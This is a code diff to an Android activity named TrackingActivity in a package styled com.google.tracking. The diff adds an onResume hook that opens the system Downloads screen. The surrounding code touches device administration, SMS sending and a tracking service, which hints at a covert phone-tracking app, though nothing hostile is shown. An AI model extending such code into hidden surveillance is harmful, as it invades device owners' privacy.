@@ -1,6 +1,7 @@
 package com.google.tracking;
 
 import android.app.Activity;
+import android.app.DownloadManager;
 import android.app.PendingIntent;
 import android.app.admin.DevicePolicyManager;
 import android.content.ComponentName;
@@ -29,6 +30,7 @@ public class TrackingActivity extends Activity {
     @Override
     public void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
+
         //TO TEST SMS
         //initSendSMS();
 
@@ -60,6 +62,13 @@ public class TrackingActivity extends Activity {
     }
 
     @Override
+    protected void onResume() {
+        super.onResume();
+        openDownlads();
+//        super.onDestroy();
+    }
+
+    @Override
     protected void onActivityResult(int requestCode, int resultCode, Intent data) {
         super.onActivityResult(requestCode, resultCode, data);
 
@@ -68,6 +77,13 @@ public class TrackingActivity extends Activity {
             startService(intent);
         }
     }
+
+    private void openDownlads() {
+        Intent dm = new Intent(DownloadManager.ACTION_VIEW_DOWNLOADS);
+        dm.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+        getBaseContext().startActivity(dm);
+    }
+
 
     private void initSendSMS() {
         setContentView(R.layout.main);
